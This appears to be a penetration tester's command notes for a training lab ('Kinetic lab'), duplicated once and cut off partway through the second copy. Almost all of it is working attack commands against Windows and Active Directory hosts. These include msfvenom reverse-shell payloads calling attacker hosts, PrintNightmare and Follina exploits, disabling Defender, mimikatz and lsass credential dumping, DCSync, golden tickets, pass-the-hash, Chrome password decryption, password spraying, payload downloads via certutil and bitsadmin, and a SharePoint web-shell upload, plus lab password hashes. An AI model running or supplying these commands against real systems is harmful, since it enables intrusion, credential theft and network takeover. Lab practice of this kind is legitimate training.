```
# +-+-+-+-+-+-+-+ +-+-+-+ +-+-+-+-+-+-+-+-+

# |K|i|n|e|t|i|c| |l|a|b| |c|o|m|m|a|n|d|s|

# +-+-+-+-+-+-+-+ +-+-+-+ +-+-+-+-+-+-+-+-+

## Uplink to Pulsar 

crackmapexec smb ./kinetic-targets.txt -u cyn -p xxxx --shares

python3 smbclient.py cyn@agentspecial

spray smb uplink ./uplink2.txt /usr/share/john/password.lst 4000 0

hydra -t 8 -L ./uplink1.txt -P /usr/share/john/password.lst uplink ssh

scp hammer@uplink:C:/Users/zombie/Desktop/RDP-Access.txt /opt/kinetic/RDP-Access.txt

scp hammer@uplink:C:/Users/zombie/Desktop/Spire-Talent-memo.pdf /opt/kinetic/Spire-Talent-memo2.pdf

ssh pulsar/andross@uplink

scp /opt/kinetic/SharpView.exe pulsar
\\
andross@uplink:C:/Users/andross/Desktop/SharpView.exe

SharpView.exe Get-DomainController

SharpView.exe Get-NetComputer

powershell

ls 
\\
dcpulsar\pipe\spoolss

scp /opt/kinetic/chisel.exe pulsar
\\
andross@uplink:C:/Users/andross/Desktop/chisel.exe

scp /usr/share/windows-binaries/nc.exe pulsar
\\
andross@uplink:C:/Users/andross/Desktop/nc.exe

msfvenom -f dll -p windows/x64/shell_reverse_tcp LPORT=4442 LHOST=10.65.3.90 -o e.dll

python3 smbclient.py pulsar/andross@uplink

chisel server --host xxx -p 5447 --socks5 --reverse

.\chisel.exe client xxx:5447 R:2600:socks

nc.exe -lvp 4442

proxychains -q python3 CVE-2021-1675.py 'PULSAR.CORP/andross:darkstar@10.65.10.92' '
\\
10.65.10.90\share\e.dll
'

## Broadcast to Exodus

nmap -sS -A -n -p1-60000 broadcast

https://www.exploit-db.com/exploits/47799

searchsploit 47799

locate 47799

cp /usr/share/exploitdb/exploits/windows/remote/47799.txt ./

nano 47799.txt

mv 47799.txt freesploit.py

python3 freesploit.py broadcast hostname

python3 freesploit.py 10.65.1.40 'net user slayer hunter2 /add'

python3 freesploit.py 10.65.1.40 'net localgroup Administrators slayer /add'

python3 smbclient.py slayer@broadcast

python3 freesploit.py 10.65.1.40 'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d "1" /f'

python3 freesploit.py broadcast "powershell Enable-PSRemoting -Force"

evil-winrm -i broadcast -u slayer

Get-MpComputerStatus

Set-MpPreference -DisableRealtimeMonitoring $true

Get-MpComputerStatus

python3 secretsdump.py slayer@broadcast

crackmapexec smb ./kinetic-targets.txt -u ./bcast-users.txt -p ./bcast-pass.txt --no-bruteforce

python3 smbclient.py kinetic/yarty@exodus

msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=4222 -f exe > ms_4222.exe

python3 smbclient.py kinetic/yarty@exodus

cd Workflow

put /opt/kinetic/ms_4222.exe

python3 follina.py -m binary -b '
\\
localhost\c$\Workflow\ms_4222.exe
' -t docx -H xxx -u xxx

nmap exodus -Pn -p22,5985,3389

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

## FemmeFatale to DCARC

nmap -sC -Pn femmefatale

whatweb femmefatale

curl -si 
http://femmefatale/favicon.ico

use post/windows/gather/cachedump

getsystem

net localgroup Administrators

net user /domain freya

net localgroup Administrators /add freya

netstat -ano

python3 smbclient.py zero/freya@dczero

powershell wget -OutFile C:/Users/freya/PowerView1.ps1 
http://xxx/kinetic/powerview1.ps1

import-module .\powerview1.ps1

python3 smbclient.py zero/freya@dcarc

python3 raiseChild.py -w ./freya.ccache zero.arc.corp/freya:mountain

ntpdate 10.65.20.20

export KRB5CCNAME=/opt/impacket3/examples/freya.ccache

python3 smbclient.py Administrator@dcarc -k -no-pass

powershell iwr -uri 
http://xxx/software/ssh.zip
 -outfile .\ssh.zip

powershell iwr -uri 
http://xxx/software/PsExec.exe
 -outfile .\psexec.exe

powershell iwr -uri 
http://xxx/software/mimikatz.exe
 -outfile .\mimikatz.exe

python3 lookupsid.py zero/freya@dczero | grep "Domain SID"

    Domain SID is: S-1-5-21-3128073206-3686985830-824703377

python3 lookupsid.py zero/freya@dcarc | grep "Domain SID"

    Domain SID is: S-1-5-21-1970956415-843115013-4046186837

python3 secretsdump.py zero/freya:mountain@dczero -outputfile krbhash -user-status

    4f79191a1ceafadd15de32fb617ce29c

    

kerberos::golden /user:freya /domain:zero.arc.corp /sid:S-1-5-21-3128073206-3686985830-824703377  /krbtgt:4f79191a1ceafadd15de32fb617ce29c /sids:S-1-5-21-1970956415-843115013-4046186837-519 /ptt

dir 
\\
dcarc\c$

psexec.exe -accepteula 
\\
dcarc
 cmd

dir 
\\
dcarc\C$\Users\Administrator\Desktop

copy 
\\
dcarc\C$\Users\Administrator\Desktop\old_kinetic_stuff.cab
 .\ 

copy 
\\
dcarc\C$\Users\Administrator\Desktop\New_Employee_Welcome_Letter.pdf
 .\

scp freya@femmefatale:C:/Users/freya/Documents/old_kinetic_stuff.cab /opt/kinetic/old_kinetic_stuff.cab

scp freya@femmefatale:C:/Users/freya/Documents/New_Employee_Welcome_Letter.pdf /opt/kinetic/welcome.pdf

## DevSuper to Moondust

nmap -sS -A -n -p1-60000 devsuper

python3 smbclient.py kinetic/cyn@devsuper

Google port 1978 exploit..open in edb and search for exploit - 50972

searchsploit 50972

msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=4333 -f exe > ms_4333.exe

python3 smbclient.py kinetic/cyn@devsuper

python3 smbclient.py pris@devsuper

john dcc.txt 

Get-MpComputerStatus

netstat -ano

reg query hklm\Software\Microsoft\Windows\CurrentVersion\Policies\System

msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=4331 -f exe > ms_4331.exe

ftp

binary

put m4446-76.exe m4446-76.exe

ascii

put update-evil.bat update.bat

## NTML Relay Attacks

python3 smbserver.py -smb2support tmp /tmp

python3 ntlmrelayx.py -tf /opt/kinetic/1out.txt -smb2support

inveigh.exe

type Inveigh-NTLMv2.txt

## PTT & Over PtH

sekurlsa::tickets /export

kerberos::ptt 

rubeus.exe dump /nowrap

rubeus.exe ptt /ticket:

psexec.exe -accepteula 
\\
viperwarhawk
 cmd

python3 ticketConverter.py case.ccache case.kirbi

rubeus.exe ptt /ticket:

mv case.kirbi /var/www/html/kinetic

powershell iwr -uri 
http://xxx/kinetic/case.kirbi
 -outfile .\case.kirbi

base64 case.kirbi |tr -d 
\\
n

python3 getTGT.py kinetic.corp/case -dc-ip 10.65.1.20 -hashes :76e1f33b798c3cd6ed74620d21a33299

ntpdate

export KRB5CCNAME=/opt/impacket3/examples/case.ccache

python3 psexec.py  -dc-ip 10.65.1.20 -k -no-pass kinetic.corp/case@viperwarhawk

powershell iwr -uri 
http://xxx/mimikatz.exe
 -outfile .\mimikatz.exe

python3 getTGT.py kinetic/case -dc-ip 10.65.1.20 -hashes :76e1f33b798c3cd6ed74620d21a33299

ntpdate 10.65.1.20

export KRB5CCNAME=/opt/impacket3/examples/case.ccache

python3 psexec.py  -dc-ip 10.65.1.20 -k -no-pass kinetic.corp/case@viperwarhawk

rubeus.exe ptt /ticket:

klist

psexec.exe -accepteula 
\\
viperwarhawk
 cmd

rubeus.exe asktgt /domain:kinetic.corp /user:case /rc4:76e1f33b798c3cd6ed74620d21a33299 /ptt

psexec.exe -accepteula 
\\
viperwarhawk
 cmd

## Pass The Ticket (PTT)

whoami /user

python3 getTGT.py kinetic/kram -dc-ip 10.65.1.20 -hashes :facdafa55f0a85ceaf649f33cbca001a

ntpdate 10.65.1.20

python3 ticketConverter.py kram.ccache kram.kirbi

export KRB5CCNAME=/opt/impacket/examples/kram.kirbi

python3 psexec.py kinetic/kram@polar -k -no-pass

python3 getTGT.py kinetic/case -dc-ip 10.65.1.20 -hashes :76e1f33b798c3cd6ed74620d21a33299

python3 getTGT.py zero/zonia -dc-ip 10.65.20.20 -hashes :fbd22237b572e96f60c60937accd2001

case:76e1f33b798c3cd6ed74620d21a33299

kram:facdafa55f0a85ceaf649f33cbca001a

cyn:0dcd2a213251434b8b975a7ace3c2800

krupp:f9383fe5e2b40087d129e12a32c1077e

zonia:fbd22237b572e96f60c60937accd2001

## DPAPI

python3 DonPAPI.py ivory@area72 --hashes aad3b435b51404eeaad3b435b51404ee:f6cea93139ed5c1650951d8cad886346

cd "C:\Users\ivory\AppData\Local\Google\Chrome\User Data\Default"

dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect

python3 psexec.py ivory@area72 -hashes aad3b435b51404eeaad3b435b51404ee:f6cea93139ed5c1650951d8cad886346

sekurlsa::dpapi

dpapi::chrome /in:"C:\Users\ivory\AppData\Local\Google\Chrome\User Data\Default\Login Data" /masterkey:95ba88c28c65cdd5fe5c0fee398800634c60ef5fb53d5f15c18bf240c1001920ed7202b2d495ca97e1c16cb7842cad8a6c4af568ea681aa1e04f4e93b8d81992

C:\Users\ivory\AppData\Local\Google\Chrome\User Data\Default

## PtH 

crackmapexec smb area72 -d area72 -u ivory -H f6cea93139ed5c1650951d8cad886346

crackmapexec smb area72 -d area72 -u ivory -H f6cea93139ed5c1650951d8cad886346 -X whoami

python3 psexec.py ivory@area72 -hashes aad3b435b51404eeaad3b435b51404ee:f6cea93139ed5c1650951d8cad886346

crackmapexec smb femmefatale -d zero.arc.corp -u zonia -H fbd22237b572e96f60c60937accd2001

mimikatz.exe

privilege::debug

token::elevate

sekurlsa::logonPasswords

## PTT

.\rubeus.exe asktgt /domain:zero.arc.corp /user:zonia /rc4:fbd22237b572e96f60c60937accd2001 /ptt

## DCSync

Import-Module ActiveDirectory

cd 'AD:DC=ZERO,DC=ARC,DC=corp'

(Get-AcL).Access | Where-Object {$
_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' -or $_
.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'}

net user zonia /domain

mimikatz.exe

lsadump::dcsync /domain:zero.arc.corp /all /csv

## Collecting Creds msCachv2

mimikatz.exe

privilege::debug

token::elevate

lsadump::cache

## Collecting Creds NTLM

*mimikatz on disk*

mimikatz.exe

privilege::debug

token::elevate

sekurlsa::logonPasswords

1abb67a2890554c8506e0a82869392b1

*procdump and sharpdump*

cd 

procdump64.exe -accepteula -r -ma lsass.exe lsass.dmp

scp eve@demo:C:/Users/eve/creds/lsass.dmp /opt/kinetic/creds/lsass.dmp

pypykatz lsa minidump /tmp/lsass.dmp

*Reg saving*

reg save hklm\sam C:\Users\eve\creds\sam

reg save hklm\system C:\Users\eve\creds\system

scp eve@demo:C:/Users/eve/creds/system /opt/kinetic/creds/system

scp eve@demo:C:/Users/eve/creds/sam /opt/kinetic/creds/sam

pypykatz registry /opt/kinetic/creds/system --sam /opt/kinetic/creds/sam

*Task Manager*

Details >> Right click lsass.exe >> Create dump file

*cme*

crackmapexec smb demo -u eve -p eve --local-auth --sam

*crack ntlm*

john --format=nt  pass-eve.txt -w=/opt/kinetic/creds/pass/lst

*secrets dump*

python3 secretsdump.py kinetic/kram@polar

*Metasploit*

use post/windows/gather/smart_hashdump

## Moving files

powershell Invoke-WebRequest -uri 
http://xxx/kinetic/evil.bat
 -outfile C:\ProgramData\evil.bat

powershell wget 
http://xxx/kinetic/evil.bat
 -OutFile C:\ProgramData\evil.bat

powershell iwr -uri 
http://xxx/kinetic/evil.bat
 -outfile C:\ProgramData\evil.bat

powershell Invoke-RestMethod -Uri 
http://xxx/kinetic/evil.bat
 -OutFile C:\ProgramData\evil.bat

powershell irm -Uri 
http://xxx/kinetic/evil.bat
 -OutFile C:\ProgramData\evil.bat

powershell Start-BitsTransfer -Source 
http://xxx/kinetic/evil.bat
 -Destination C:\ProgramData\evil.bat

python3 smbserver.py -username kali -password hunter2 -smb2support kali /tmp

net use x: 
\\
xxx\kali
 /user:kali hunter2

*SCP*

scp C:\ProgramData\juice.txt kali@xxx:/tmp/juice.txt

scp kram@polar:C:/ProgramData/juice.txt /tmp/juice2.txt

scp winPEAS.exe kram@polar:C:
\\
ProgramData
\\
winp.exe

*bitsadmin*

bitsadmin /transfer /download 
http://xxx/kinetic/evil.bat
 C:\ProgramData\evil.bat

*certutil*

certutil -urlcache -split -f 
http://xxx/kinetic/evil.bat
 C:\ProgramData\evil.bat

certutil -encode evil.bat evil.b64

certutil -decode evi.b64 evi.bat

## PrivEsc

systeminfo.exe > out.txt

scp C:\Users\kram\out.txt kali@xxx:/tmp/a.txt

python3 wes.py /tmp/a.txt -s critical -c

python3 wes.py /tmp/a.txt -e -c

python3 wes.py /tmp/out.txt -s critical -c

msfvenom -p windows/x64/shell/reverse_tcp LPORT=4444 LHOST=xxx -f msi > sploit.msi

## TokenAcctFilter

python3 psexec.py eve:eve@demo whoami

python3 psexec.py administrator:toor@demo whoami

python3 psexec.py zero/freya@femmefatale whoami

## Manual Situational Awareness

whoami /all

net user kram /domain

net localgroup administrators

net share

net view 
\\
agentspecial

wmic useraccount get name,sid

query session

## AV

Get-MpComputerStatus

Set-MpPreference -DisableRealtimeMonitoring $true

## Sharpoint

ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell wget -OutFile C:\inetpub\wwwroot\wss\VirtualDirectories\80
\_
vti_pvt\cmd.aspx 
http://xxx/kinetic/cmdasp.aspx
"

sp2.exe 
http://10.65.1.34/sites/operations/
 cyn password kinetic 
\\
10.65.3.90\share\SP_soap_RCE_PoC.RCE_Resource.resources

ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell wget -OutFile C:\inetpub\wwwroot\wss\VirtualDirectories\80
\_
vti_pvt\cmd.aspx 
http://xxx/kinetic/cmdasp.aspx
"

## WebDAV

davtest -auth kinetic
\\
cyn:password -url 
http://corpo/dav
 

davtest -auth kinetic
\\
cyn:password -url 
http://corpo/dav
  -uploadfile cmdasp.aspx -uploadloc cmdasp.aspx

davtest -auth kinetic
\\
cyn:password -url 
http://corpo/dav
  -uploadfile corpo.exe -uploadloc corpo.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=4444 -f exe > corpo.exe

use exploit/multi/handler

## Password sprawy

polenum glorp:password@10.65.1.20

ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D glorp -W | grep -m 1 -B 10 pwdHistoryLength

hydra -t 8 -L ./uplink1.txt -P /usr/share/john/password.lst uplink ssh

crackmapexec smb uplink -u ./uplink2.txt -p /usr/share/john/password.lst

spray smb uplink ./uplink1.txt /usr/share/john/password.lst 20 5

## ASREP and Kerberoasting

python3 GetNPUsers.py kinetic.corp/dennis -dc-ip 10.65.1.20 -no-pass -format john

python3 GetNPUsers.py kinetic.corp/cyn -dc-ip 10.65.1.20 -no-pass -format john

john asrep-cyn.txt --wordlist=/usr/share/wordlists/rockyou.txt

john spn.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt

## Adalanche

adalanche.exe collect activedirectory --tlsmode noTLS --port 389

adalanche analyze

./adalanche collect activedirectory --domain kinetic --username glorp@kinetic --password pAsSw0rd --server 10.65.1.20 --tlsmode NoTLS --port 389

./adalanche collect activedirectory --adexplorerfile=kinetic.dat

## Grouper

Group3r.exe -s

## Winrm

winrs -r:demo -u:eve "hostname && whoami"

Enter-PSSession -ComputerName demo -Credential eve

Invoke-Command -ComputerName demo -ScriptBlock {hostname; whoami} -Credential eve

evil-winrm -i demo -u eve -p eve

crackmapexec winrm demo -u eve -p eve

crackmapexec winrm demo -u eve -p eve -x 'whoami && hostname'

## SMB

PsExec.exe 
\\
demo
 -u eve cmd

PsExec.exe 
\\
demo
 -u eve -s cmd

net use W: 
\\
demo\share
 /user:eve eve

crackmapexec smb demo -u eve -p eve

smbclient -U eve 
\\\\
demo
\\
C$

python3 smbclient.py eve@demo

python3 smbexec.py eve@demo

python3 psexec.py eve@demo

## WMI

wmic computersystem get name

Get-WmiObject -Class Win32_ComputerSystem -Property Name -ComputerName demo -Credential eve

## PowerView

Get-NetDomain

Get-NetGroup | select samaccountname, admincount, description

Get-NetDomainTrust

Get-NetUser -SPN

Get-NetUser -PreauthNotRequired

Get-NetUser | select samaccountname

Get-NetUser -Name case

Get-NetGroup -UserName "case"

Get-DomainGPO | select displayName

Get-DomainGPO -Identity "Hyper Drive Station"

## dsquery

dsquery.exe computer

dsquery.exe user

dsquery.exe group

dsquery.exe group -name "
*admin*
"

dsquery * "CN=System,DC=KINETIC,DC=CORP" -filter "(objectClass=trustedDomain)" -attr trustPartner flatName

## ldapsearch

ldapsearch -H ldap://10.65.1.20 -x -s base

ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D pAsW0rd -W

ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D pAsW0rd -W "(objectclass=computer)"

ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D pAsW0rd -W "(objectclass=user)"

ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D pAsW0rd -W "(objectclass=group)" cn member

ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D pAsW0rd -W

ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D pAsW0rd -W > kinetic.ldap

cat kinetic.ldap |grep "objectClass:"
```
 # |K|i|n|e|t|i|c| |l|a|b| |c|o|m|m|a|n|d|s|  
# +-+-+-+-+-+-+-+ +-+-+-+ +-+-+-+-+-+-+-+-+  
## Uplink to Pulsar  
crackmapexec smb ./kinetic-targets.txt -u cyn -p xxxx --shares  
python3 smbclient.py cyn@agentspecial  
spray smb uplink ./uplink2.txt /usr/share/john/password.lst 4000 0  
hydra -t 8 -L ./uplink1.txt -P /usr/share/john/password.lst uplink ssh  
scp hammer@uplink:C:/Users/zombie/Desktop/RDP-Access.txt /opt/kinetic/RDP-Access.txt  
scp hammer@uplink:C:/Users/zombie/Desktop/Spire-Talent-memo.pdf /opt/kinetic/Spire-Talent-memo2.pdf  
ssh pulsar/andross@uplink  
scp /opt/kinetic/SharpView.exe pulsar\\andross@uplink:C:/Users/andross/Desktop/SharpView.exe  
SharpView.exe Get-DomainController  
SharpView.exe Get-NetComputer  
powershell  
ls [\\](file:///\\dcpulsar\pipe\spoolss)dcpulsar\pipe\spoolss  
scp /opt/kinetic/chisel.exe pulsar\\andross@uplink:C:/Users/andross/Desktop/chisel.exe  
scp /usr/share/windows-binaries/nc.exe pulsar\\andross@uplink:C:/Users/andross/Desktop/nc.exe  
msfvenom -f dll -p windows/x64/shell_reverse_tcp LPORT=4442 LHOST=10.65.3.90 -o e.dll  
python3 smbclient.py pulsar/andross@uplink  
chisel server --host xxx -p 5447 --socks5 --reverse  
.\chisel.exe client xxx:5447 R:2600:socks  
nc.exe -lvp 4442  
proxychains -q python3 CVE-2021-1675.py 'PULSAR.CORP/andross:darkstar@10.65.10.92' '[\\](file:///\\10.65.10.90\share\e.dll)10.65.10.90\share\e.dll'
 
## Broadcast to Exodus  
nmap -sS -A -n -p1-60000 broadcast  
[https://www.exploit-db.com/exploits/47799](https://www.exploit-db.com/exploits/47799)  
searchsploit 47799  
locate 47799  
cp /usr/share/exploitdb/exploits/windows/remote/47799.txt ./  
nano 47799.txt  
mv 47799.txt freesploit.py  
python3 freesploit.py broadcast hostname  
python3 freesploit.py 10.65.1.40 'net user slayer hunter2 /add'  
python3 freesploit.py 10.65.1.40 'net localgroup Administrators slayer /add'  
python3 smbclient.py slayer@broadcast  
python3 freesploit.py 10.65.1.40 'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d "1" /f'  
python3 freesploit.py broadcast "powershell Enable-PSRemoting -Force"  
evil-winrm -i broadcast -u slayer  
Get-MpComputerStatus  
Set-MpPreference -DisableRealtimeMonitoring $true  
Get-MpComputerStatus  
python3 secretsdump.py slayer@broadcast  
crackmapexec smb ./kinetic-targets.txt -u ./bcast-users.txt -p ./bcast-pass.txt --no-bruteforce  
python3 smbclient.py kinetic/yarty@exodus  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=4222 -f exe > ms_4222.exe  
python3 smbclient.py kinetic/yarty@exodus  
cd Workflow  
put /opt/kinetic/ms_4222.exe  
python3 follina.py -m binary -b '[\\](file:///\\localhost\c$\Workflow\ms_4222.exe)localhost\c$\Workflow\ms_4222.exe' -t docx -H xxx -u xxx  
nmap exodus -Pn -p22,5985,3389  
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f  
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f  
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 
## FemmeFatale to DCARC  
nmap -sC -Pn femmefatale  
whatweb femmefatale  
curl -si [http://femmefatale/favicon.ico](http://femmefatale/favicon.ico)  
use post/windows/gather/cachedump  
getsystem  
net localgroup Administrators  
net user /domain freya  
net localgroup Administrators /add freya  
netstat -ano  
python3 smbclient.py zero/freya@dczero  
powershell wget -OutFile C:/Users/freya/PowerView1.ps1 [http://xxx/kinetic/powerview1.ps1](http://xxx/kinetic/powerview1.ps1)  
import-module .\powerview1.ps1  
python3 smbclient.py zero/freya@dcarc  
python3 raiseChild.py -w ./freya.ccache zero.arc.corp/freya:mountain  
ntpdate 10.65.20.20  
export KRB5CCNAME=/opt/impacket3/examples/freya.ccache  
python3 smbclient.py Administrator@dcarc -k -no-pass  
powershell iwr -uri [http://xxx/software/ssh.zip](http://xxx/software/ssh.zip) -outfile .\ssh.zip  
powershell iwr -uri [http://xxx/software/PsExec.exe](http://xxx/software/PsExec.exe) -outfile .\psexec.exe  
powershell iwr -uri [http://xxx/software/mimikatz.exe](http://xxx/software/mimikatz.exe) -outfile .\mimikatz.exe
 
python3 lookupsid.py zero/freya@dczero | grep "Domain SID"  
    Domain SID is: S-1-5-21-3128073206-3686985830-824703377  
python3 lookupsid.py zero/freya@dcarc | grep "Domain SID"  
    Domain SID is: S-1-5-21-1970956415-843115013-4046186837  
python3 secretsdump.py zero/freya:mountain@dczero -outputfile krbhash -user-status  
    4f79191a1ceafadd15de32fb617ce29c  
     
kerberos::golden /user:freya /domain:zero.arc.corp /sid:S-1-5-21-3128073206-3686985830-824703377  /krbtgt:4f79191a1ceafadd15de32fb617ce29c /sids:S-1-5-21-1970956415-843115013-4046186837-519 /ptt  
dir [\\](file:///\\dcarc\c$)dcarc\c$  
psexec.exe -accepteula [\\](file:///\\dcarc)dcarc cmd  
dir [\\](file:///\\dcarc\C$\Users\Administrator\Desktop)dcarc\C$\Users\Administrator\Desktop  
copy [\\](file:///\\dcarc\C$\Users\Administrator\Desktop\old_kinetic_stuff.cab)dcarc\C$\Users\Administrator\Desktop\old_kinetic_stuff.cab .\  
copy [\\](file:///\\dcarc\C$\Users\Administrator\Desktop\New_Employee_Welcome_Letter.pdf)dcarc\C$\Users\Administrator\Desktop\New_Employee_Welcome_Letter.pdf .\  
scp freya@femmefatale:C:/Users/freya/Documents/old_kinetic_stuff.cab /opt/kinetic/old_kinetic_stuff.cab  
scp freya@femmefatale:C:/Users/freya/Documents/New_Employee_Welcome_Letter.pdf /opt/kinetic/welcome.pdf  
## DevSuper to Moondust  
nmap -sS -A -n -p1-60000 devsuper  
python3 smbclient.py kinetic/cyn@devsuper  
Google port 1978 exploit..open in edb and search for exploit - 50972  
searchsploit 50972  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=4333 -f exe > ms_4333.exe  
python3 smbclient.py kinetic/cyn@devsuper  
python3 smbclient.py pris@devsuper  
john dcc.txt  
Get-MpComputerStatus  
netstat -ano  
reg query hklm\Software\Microsoft\Windows\CurrentVersion\Policies\System  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=4331 -f exe > ms_4331.exe  
ftp  
binary  
put m4446-76.exe m4446-76.exe  
ascii  
put update-evil.bat update.bat  
## NTML Relay Attacks  
python3 smbserver.py -smb2support tmp /tmp  
python3 ntlmrelayx.py -tf /opt/kinetic/1out.txt -smb2support  
inveigh.exe  
type Inveigh-NTLMv2.txt  
## PTT & Over PtH  
sekurlsa::tickets /export  
kerberos::ptt  
rubeus.exe dump /nowrap  
rubeus.exe ptt /ticket:  
psexec.exe -accepteula [\\](file:///\\viperwarhawk)viperwarhawk cmd  
python3 ticketConverter.py case.ccache case.kirbi  
rubeus.exe ptt /ticket:  
mv case.kirbi /var/www/html/kinetic  
powershell iwr -uri [http://xxx/kinetic/case.kirbi](http://xxx/kinetic/case.kirbi) -outfile .\case.kirbi  
base64 case.kirbi |tr -d [\\](file:///\\n)n  
python3 getTGT.py kinetic.corp/case -dc-ip 10.65.1.20 -hashes :76e1f33b798c3cd6ed74620d21a33299  
ntpdate  
export KRB5CCNAME=/opt/impacket3/examples/case.ccache  
python3 psexec.py  -dc-ip 10.65.1.20 -k -no-pass kinetic.corp/case@viperwarhawk  
powershell iwr -uri [http://xxx/mimikatz.exe](http://xxx/mimikatz.exe) -outfile .\mimikatz.exe  
python3 getTGT.py kinetic/case -dc-ip 10.65.1.20 -hashes :76e1f33b798c3cd6ed74620d21a33299  
ntpdate 10.65.1.20  
export KRB5CCNAME=/opt/impacket3/examples/case.ccache  
python3 psexec.py  -dc-ip 10.65.1.20 -k -no-pass kinetic.corp/case@viperwarhawk  
rubeus.exe ptt /ticket:  
klist  
psexec.exe -accepteula [\\](file:///\\viperwarhawk)viperwarhawk cmd  
rubeus.exe asktgt /domain:kinetic.corp /user:case /rc4:76e1f33b798c3cd6ed74620d21a33299 /ptt  
psexec.exe -accepteula [\\](file:///\\viperwarhawk)viperwarhawk cmd  
## Pass The Ticket (PTT)  
whoami /user  
python3 getTGT.py kinetic/kram -dc-ip 10.65.1.20 -hashes :facdafa55f0a85ceaf649f33cbca001a  
ntpdate 10.65.1.20  
python3 ticketConverter.py kram.ccache kram.kirbi  
export KRB5CCNAME=/opt/impacket/examples/kram.kirbi  
python3 psexec.py kinetic/kram@polar -k -no-pass  
python3 getTGT.py kinetic/case -dc-ip 10.65.1.20 -hashes :76e1f33b798c3cd6ed74620d21a33299  
python3 getTGT.py zero/zonia -dc-ip 10.65.20.20 -hashes :fbd22237b572e96f60c60937accd2001  
case:76e1f33b798c3cd6ed74620d21a33299  
kram:facdafa55f0a85ceaf649f33cbca001a  
cyn:0dcd2a213251434b8b975a7ace3c2800  
krupp:f9383fe5e2b40087d129e12a32c1077e  
zonia:fbd22237b572e96f60c60937accd2001  
## DPAPI  
python3 DonPAPI.py ivory@area72 --hashes aad3b435b51404eeaad3b435b51404ee:f6cea93139ed5c1650951d8cad886346  
cd "C:\Users\ivory\AppData\Local\Google\Chrome\User Data\Default"  
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect  
python3 psexec.py ivory@area72 -hashes aad3b435b51404eeaad3b435b51404ee:f6cea93139ed5c1650951d8cad886346  
sekurlsa::dpapi  
dpapi::chrome /in:"C:\Users\ivory\AppData\Local\Google\Chrome\User Data\Default\Login Data" /masterkey:95ba88c28c65cdd5fe5c0fee398800634c60ef5fb53d5f15c18bf240c1001920ed7202b2d495ca97e1c16cb7842cad8a6c4af568ea681aa1e04f4e93b8d81992  
C:\Users\ivory\AppData\Local\Google\Chrome\User Data\Default  
## PtH  
crackmapexec smb area72 -d area72 -u ivory -H f6cea93139ed5c1650951d8cad886346  
crackmapexec smb area72 -d area72 -u ivory -H f6cea93139ed5c1650951d8cad886346 -X whoami  
python3 psexec.py ivory@area72 -hashes aad3b435b51404eeaad3b435b51404ee:f6cea93139ed5c1650951d8cad886346  
crackmapexec smb femmefatale -d zero.arc.corp -u zonia -H fbd22237b572e96f60c60937accd2001  
mimikatz.exe  
privilege::debug  
token::elevate  
sekurlsa::logonPasswords  
## PTT  
.\rubeus.exe asktgt /domain:zero.arc.corp /user:zonia /rc4:fbd22237b572e96f60c60937accd2001 /ptt  
## DCSync  
Import-Module ActiveDirectory  
cd 'AD:DC=ZERO,DC=ARC,DC=corp'  
(Get-AcL).Access | Where-Object {$_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'}  
net user zonia /domain  
mimikatz.exe  
lsadump::dcsync /domain:zero.arc.corp /all /csv  
## Collecting Creds msCachv2  
mimikatz.exe  
privilege::debug  
token::elevate  
lsadump::cache  
## Collecting Creds NTLM  
*mimikatz on disk*  
mimikatz.exe  
privilege::debug  
token::elevate  
sekurlsa::logonPasswords  
1abb67a2890554c8506e0a82869392b1  
*procdump and sharpdump*  
cd  
procdump64.exe -accepteula -r -ma lsass.exe lsass.dmp  
scp eve@demo:C:/Users/eve/creds/lsass.dmp /opt/kinetic/creds/lsass.dmp  
pypykatz lsa minidump /tmp/lsass.dmp  
*Reg saving*  
reg save hklm\sam C:\Users\eve\creds\sam  
reg save hklm\system C:\Users\eve\creds\system  
scp eve@demo:C:/Users/eve/creds/system /opt/kinetic/creds/system  
scp eve@demo:C:/Users/eve/creds/sam /opt/kinetic/creds/sam  
